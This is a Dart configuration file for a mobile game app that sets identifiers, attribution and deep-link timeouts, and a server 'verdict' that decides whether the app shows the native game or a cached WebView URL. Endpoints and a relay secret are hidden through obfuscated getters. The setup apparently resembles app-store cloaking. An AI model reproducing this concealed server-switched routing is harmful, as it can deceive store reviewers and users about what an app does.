import 'veiled_bytes.dart';

// Central place for the identifiers and tunables the relay layer
// reads. Identity strings stay as plain constants — they're public
// on the store listing anyway. Endpoints, keys and UA fragments are
// pulled through the veiled_bytes getters so they don't sit in the
// binary as readable literals.

abstract final class RelayConfig {
  // Identity — must line up with the Android applicationId/namespace,
  // the manifest label, google-services.json and the pubspec name.
  static const String applicationId = 'com.iceboundmyth.iceboundmythgame';
  static const String marketId = 'com.iceboundmyth.iceboundmythgame';
  static const String displayName = 'Icebound Myth';

  /// Numeric iOS App Store id. Empty on Android-only builds; the
  /// backend treats "" as "fall back to the applicationId".
  static const String storeNumericId = '';

  // ── Timings ─────────────────────────────────────────────
  // Seconds unless the name says otherwise.

  /// How long "Skip" on the notification prompt suppresses it.
  /// 2d 23h 37m 14s — under three days so the next launch after
  /// that window shows the prompt again.
  static const int permissionSnoozeSeconds = 257834;

  /// Pause before re-pulling attribution when AppsFlyer first reports
  /// an install as Organic.
  static const int organicRescueDelay = 6;

  /// Verdict POST timeout.
  static const int verdictTimeoutSeconds = 13;

  /// Cap on waiting for the install-conversion payload on a cold install.
  static const int firstInstallAwaitSeconds = 30;

  /// Same wait for a returning launch, where attribution is usually cached.
  static const int returningInstallAwaitSeconds = 9;

  /// Cap on waiting for the deep-link callback.
  static const int deepLinkAwaitSeconds = 3;

  /// DNS probe timeout. Kept generous so a slow VPN tunnel does not
  /// read as offline.
  static const int reachProbeTimeoutSeconds = 9;

  /// Debounce before a connectivity drop is committed to routing (ms).
  static const int reachDropDebounceMs = 700;

  /// WebView retries on a main-frame redirect loop (-1007 / -9).
  static const int redirectLoopRetries = 2;

  /// How long a cached verdict URL stays usable (8 days).
  static const int cachedUrlLifetimeSeconds = 691200;

  // ── Resolved endpoints & credentials ────────────────────
  static String get endpointUrl => unlockEndpointUrl();
  static String get attributionKey => unlockAttributionKey();
  static String get messagingProjectId => unlockMessagingProject();

  /// Shared secret for the relay envelope (RELAY_SECRET).
  static String get relaySecret => unlockRelaySecret();

  static String get storeId {
    if (storeNumericId.isNotEmpty) return 'id$storeNumericId';
    return marketId;
  }

  /// Routing stays on the native game until all three encoded values
  /// are present, so the app builds and runs before the backend is
  /// wired up and QA can smoke-test the game path.
  static bool get credentialsReady =>
      endpointUrl.isNotEmpty &&
      attributionKey.isNotEmpty &&
      messagingProjectId.isNotEmpty;
}
